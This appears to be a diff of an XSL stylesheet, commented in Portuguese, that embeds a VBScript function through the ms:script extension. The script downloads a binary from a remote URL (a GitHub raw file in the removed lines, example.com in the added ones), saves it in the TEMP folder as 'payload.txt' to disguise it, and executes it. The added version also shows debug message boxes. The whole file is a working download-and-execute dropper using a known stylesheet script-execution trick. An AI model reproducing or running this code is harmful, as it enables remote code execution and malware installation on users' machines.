@@ -1,55 +1,45 @@
-<?xml version="1.0"?>
-<xsl:stylesheet version="1.0"
-    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-    xmlns:ms="urn:schemas-microsoft-com:xslt"
-    xmlns:user="https://example.com/script">
+<ms:script language="VBScript" implements-prefix="user">
+  <![CDATA[
+    Function main()
+      Dim objShell
+      Dim objHTTP
+      Dim objStream
+      Dim strURL
+      Dim strFilePath
+      Dim strTempDir
 
-  <ms:script language="VBScript" implements-prefix="user">
-    <![CDATA[
-      Function main( )
-        Dim objShell
-        Dim objHTTP
-        Dim objStream
-        Dim strURL
-        Dim strFilePath
-        Dim strTempDir
+      strURL = "http://example.com/test_binary.exe"
 
-        ' URL do binário a ser baixado (substitua por um URL de teste seguro)
-        strURL = "https://github.com/fonfon08/mystuffzx/raw/refs/heads/main/exelon.exe" ' Ex: um calc.exe renomeado
+      Set objShell = CreateObject("WScript.Shell" )
+      strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
+      MsgBox "Diretório TEMP: " & strTempDir, vbInformation, "Depuração XSL"
 
-        ' Obter o diretório temporário do sistema
-        Set objShell = CreateObject("WScript.Shell" )
-        strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
+      strFilePath = strTempDir & "\payload.txt"
+      MsgBox "Caminho do arquivo: " & strFilePath, vbInformation, "Depuração XSL"
 
-        ' Caminho completo para salvar o binário com extensão "morta"
-        strFilePath = strTempDir & "\payload.txt" ' Salva como .txt
+      Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+      objHTTP.open "GET", strURL, False
+      objHTTP.send
+      MsgBox "Download concluído. Status: " & objHTTP.status, vbInformation, "Depuração XSL"
 
-        ' Baixar o binário
-        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-        objHTTP.open "GET", strURL, False
-        objHTTP.send
-
-        ' Salvar o binário no arquivo temporário
+      If objHTTP.status = 200 Then
         Set objStream = CreateObject("ADODB.Stream")
         objStream.Open
-        objStream.Type = 1 ' adTypeBinary
+        objStream.Type = 1
         objStream.Write objHTTP.responseBody
-        objStream.SaveToFile strFilePath, 2 ' adSaveCreateOverWrite
+        objStream.SaveToFile strFilePath, 2
         objStream.Close
+        MsgBox "Binário salvo em: " & strFilePath, vbInformation, "Depuração XSL"
 
-        ' Executar o binário salvo
-        ' Mesmo com a extensão .txt, o WScript.Shell.Run pode executá-lo se for um PE válido
-        objShell.Run strFilePath, 1, True ' 0 para ocultar janela, True para esperar terminar
+        objShell.Run strFilePath, 1, True
+        MsgBox "Execução do binário iniciada.", vbInformation, "Depuração XSL"
+      Else
+        MsgBox "Erro no download. Status HTTP: " & objHTTP.status, vbCritical, "Depuração XSL"
+      End If
 
-        Set objShell = Nothing
-        Set objHTTP = Nothing
-        Set objStream = Nothing
-      End Function
-    ]]>
-  </ms:script>
-
-  <xsl:template match="/">
-    <xsl:value-of select="user:main()"/>
-  </xsl:template>
-
-</xsl:stylesheet>
+      Set objShell = Nothing
+      Set objHTTP = Nothing
+      Set objStream = Nothing
+    End Function
+  ]]>
+</ms:script>
